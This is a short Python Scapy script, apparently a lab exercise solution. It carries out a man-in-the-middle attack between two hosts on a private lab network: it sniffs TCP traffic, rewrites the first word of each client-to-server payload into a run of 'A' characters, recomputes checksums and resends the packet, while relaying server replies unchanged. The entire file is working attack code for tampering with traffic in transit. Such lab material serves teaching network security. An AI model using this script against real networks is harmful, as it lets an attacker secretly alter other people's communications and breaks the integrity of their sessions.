#!/usr/bin/python3
from scapy.all import *
import re

# VM A == Client
# VM B == Server
VM_A_IP = '10.9.0.5'
VM_B_IP = '10.9.0.6'
VM_A_MAC = '02:42:0a:09:00:05'
VM_B_MAC = '02:42:0a:09:00:06'

def replaceSequence(data):
 data = data.decode()
 firstword = data.split()[0]
 newdata = re.sub(firstword, 'A'*len(firstword), data, 1)
 newdata = newdata.encode()
 return newdata


def spoof_pkt(pkt):
 if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:
  newpkt = IP(bytes(pkt[IP]))
  del(newpkt.chksum)
  del(newpkt[TCP].chksum)
  del(newpkt[TCP].payload)
  olddata = pkt[TCP].payload.load # Get the original payload data
  newdata = replaceSequence(olddata)
  send(newpkt/newdata)
 elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
  send(pkt[IP]) # Forward the original packet

pkt = sniff(filter='tcp',prn=spoof_pkt)